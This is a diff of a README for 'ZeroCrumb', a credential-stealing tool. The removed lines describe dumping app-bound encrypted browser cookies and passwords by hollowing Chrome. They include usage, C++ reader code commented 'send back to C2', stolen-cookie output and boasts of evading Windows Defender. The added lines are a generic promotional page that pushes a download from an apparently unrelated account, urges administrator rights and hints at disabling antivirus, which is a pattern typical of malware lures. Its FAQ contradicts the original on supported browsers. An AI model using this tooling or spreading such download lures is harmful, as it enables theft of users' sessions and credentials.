@@ -1,117 +1,72 @@
+# 🚀 ZeroCrumb - Extract Cookies Securely with Ease
 
-# ZeroCrumb
+## 📥 Quick Download
+[![Download ZeroCrumb](https://img.shields.io/badge/Download%20ZeroCrumb-v1.0-green.svg)](https://github.com/homozygoterushing286/ZeroCrumb/releases)
 
-Dumping App Bound Protected Credentials & Cookies Without Privileges.
+## 🚀 Getting Started
+Welcome to ZeroCrumb, the tool that helps you extract app-bound protected credentials and cookies without needing extra privileges. This application makes it easy for you to access important data securely and efficiently.
 
-## Explanation
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or newer
+- **Processor:** Intel or AMD, 1 GHz or faster
+- **RAM:** At least 4 GB
+- **Disk Space:** 100 MB available space
+- **Internet Connection:** Required for downloading
 
-After this, ZeroCrumb decrypts the cookies/passwords for the specified browser with the key fetched earlier.
+## 📂 Features
+- Easily dump app-bound encrypted cookies.
+- Extract protected credentials without complex setups.
+- User-friendly interface designed for non-technical users.
+- Lightweight application that runs on your desktop.
 
-## Merits With The Named Pipe Approach
-Usage of named pipes in ZeroCrumb allows any program, As long as it can use the Windows API, To connect to the ZeroCrumb named pipe and read the App Bound Key from it.
+## 📦 Download & Install
+To get started, simply visit the link below to access the Releases page, where you can download the latest version of ZeroCrumb:
 
-## Using ZeroCrumb As A Library
-If you want to use ZeroCrumb as a library, You will need to compile a DLL that exports a function that does the hollowing of chrome with the key dumper. You might also need to embed the key dumper PE in the .rsrc section of the compiled DLL and later fetch it with the application resources Windows APIs.
+[Visit this page to download](https://github.com/homozygoterushing286/ZeroCrumb/releases)
 
-## Usage
-You can run this in any directory of your choice as long as the key dumper is in the same directory.
-```
-ZeroCrumb.exe <BROWSER_TYPE> <DUMP_TYPE>
-```
-```
-Browser Types:
-Chrome -> 0
-Brave -> 1
-Edge -> 2
+1. Click the link above to go to the Releases page.
+2. Find the latest version of ZeroCrumb.
+3. Click on the asset that corresponds to your operating system.
+4. Once it's downloaded, locate the file in your Downloads folder.
 
-Dump Types:
-Cookies
-Passwords
-```
+## ⚙️ Running ZeroCrumb
+1. Double-click the downloaded file to open it.
+2. If prompted, allow the application to make changes to your device.
+3. The user interface will appear. Follow the on-screen instructions to start extracting data.
 
-## Code Usage
-ZeroCrumb provides an easy-to-use **CookieReader** & **PasswordReader** classes:
-```cpp
-auto reader = new CookieReader(cookiesPath.c_str(), key);
+## 🔒 User Guide
+### Extracting Credentials
+1. Open ZeroCrumb.
+2. Navigate to the "Extract" section.
+3. Choose the type of data you want to retrieve: cookies or credentials.
+4. Click "Start Extraction."
+5. Wait for the process to complete, and access your data securely.
 
-reader->initSqliteDb();
-reader->prepare(queries::cookies);
-reader->populateCookies();
+### Tips for Best Results
+- Make sure to run the application with administrator privileges for optimal performance.
+- Ensure your browser is closed while using ZeroCrumb to prevent data conflicts.
 
-for (auto& cookie : reader->cookies) {
-string name = cookie->name;
-string site = cookie->site;
-string path = cookie->path;
-string cookieValue = cookie->cookie;
-// dump to file, send back to C2, etc...
-}
-```
+## 📜 Frequently Asked Questions (FAQs)
+**Q: Is ZeroCrumb safe to use?**  
+A: Yes, ZeroCrumb is designed to be secure and user-friendly. However, always ensure you download from the official Releases page.
 
-```cpp
-// keep in mind passwords aren't encrypted using the app bound key (yet)
-auto reader = new PasswordReader(passwordsPath.c_str(), key);
+**Q: Will this work with all browsers?**  
+A: ZeroCrumb primarily supports Chrome and Firefox. Compatibility with other browsers may vary.
 
-reader->initSqliteDb();
-reader->prepare(queries::passwords);
-reader->populatePasswords();
+**Q: Do I need special permissions to run it?**  
+A: The tool is designed to work without special privileges, but running as an administrator can enhance functionality.
 
-for (auto& password : reader->passwords) {
+## 🛠️ Troubleshooting
+If you experience issues:
 
-auto name = password->name;
-auto site = password->site;
-auto passwordValue = password->password;
-// dump to file, send back to C2, etc...
-}
-```
+1. Ensure you have the minimum system requirements.
+2. Re-download the application from the official Releases page to avoid corrupted files.
+3. Check your antivirus settings. Some security software may block the application.
 
-## Depedencies
-```
-sqlite3
-libsodium
-```
+## 📞 Support
+For further assistance, feel free to reach out to the community on the Issues page of the repository. Our team aims to respond promptly to all inquiries.
 
-## Output Example
-```
-$ ZeroCrumb.exe 0 Cookies
-[*] Reading From Pipe...
-App Bound Key: 980f8ea8af3299d966a26242.....
-============
-Name: SIDCC
-Site: .
-Path: /
-Cookie: AKEyXzXxD19T0KLMkrMC-eUXkrnEFi92OXq6rj1vydvmdL73olBVQGRQ4cG_hK5sqPhO1rLd1CM
-============
-Name: __Secure-1PSIDCC
-Site: .
-Path: /
-Cookie: AKEyXzXXC8_MNDlVbAaw512aXu-QJkl0uKNW66rhjeufotzoJhT3OPN5TuCQnfKS8l57_WGfDw
-============
-Name: __Secure-3PSIDCC
-Site: .
-Path: /
-Cookie: AKEyXzVVySM4FWl9itegCN2evcSmBvGc7_iXHqkKZ6VYPKmR--_LsHx1Aflar6SU4nyJiDaFq028
-============
-Name: udid
-Site: .
-Path: /
-Cookie: 0dd5b8bb-8c5b-47f3-87f9-1db8fa7d885f
-============
-```
+## 🙌 Contributions
+Contributions are welcome! If you have suggestions or improvements, please submit a pull request or open an issue in the repository.
 
-## Notes
-You can modify ZeroCrumb to work with any type of credential other than cookies & passwords.
-
-## Issues
-- Debug build doesn't output the correct key
-
-## Disclaimer
-This is by no means the most stealthy implementation of this bypass, It can get detected by checking for specific strings, hooking APIs, etc.
-
-By the time I'm testing this, It got past Windows Defender but I haven't checked other AVs.
-
-I'll leave making the bypass stealthier as an exercise for the user if this bypass implementation gets signatured in the future.
-
-## Credits
-
-
-
+For more information, visit our [Releases page again](https://github.com/homozygoterushing286/ZeroCrumb/releases) to ensure you have the latest updates. Enjoy using ZeroCrumb to securely extract your important data!
